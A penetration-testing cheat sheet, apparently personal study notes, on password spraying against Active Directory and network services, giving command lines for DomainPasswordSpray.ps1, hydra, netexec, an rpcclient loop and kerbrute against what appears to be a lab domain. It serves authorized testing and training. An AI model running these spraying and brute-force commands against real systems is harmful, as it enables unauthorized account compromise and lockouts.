# Password Spray

> Don't get locked out. See [Password policy]({{< relref "8. Lateral Movement/AD Enumeration/Password policy" >}})
> Spray and pray

Generally, this is not a good method to obtain credentials. It is noisy, easy to get caught, and probability of success is low.

Should be used as a last method available

## From Windows

### `DomainPasswordSpray.ps1`

> Download, then transfer the ps module to windows with any method in `Misc/File Transfer`

```sh
wget https://github.com/dafthack/DomainPasswordSpray/raw/refs/heads/master/DomainPasswordSpray.ps1
```

Import module

```powershell
Import-Module .\DomainPasswordSpray.ps1
```

Spray and pray

```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## From Linux

### `hydra`

General syntax

```sh
hydra -L user.list -P password.list (or -l '<user>' -p 'pass' ) <proto>://<target-IP>
```

Available protocol: God, wtf

```
adam6500  afp  asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) mysql5 ncp nntp oracle oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp radmin2 redis rexec rlogin rpcap rsh rtsp s7-300  sapr3  sip  smb  smtp[s]  smtp-enum  snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
```

#### With password list (bruteforce)

```sh
hydra -L user.list -P password.list <proto>://$target
```

#### Spray

```sh
hydra -L user.list -p 'Welcome1' <proto>://$target
```

### `netexec`

General syntax

```sh
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

Available protocol: `ssh`,`rdp`,`smb`,`ldap`,`mssql`,`ftp`,`winrm`,`wmi`,`vnc`,`nfs`

#### With password list

```sh
netexec <proto> $target -u users.txt -p passwords.txt
```

#### Spray

```sh
netexec <proto> $target -u users.txt -p "$pass"
```

### `rcpclient`

```sh
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### `kerbrute`

```sh
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
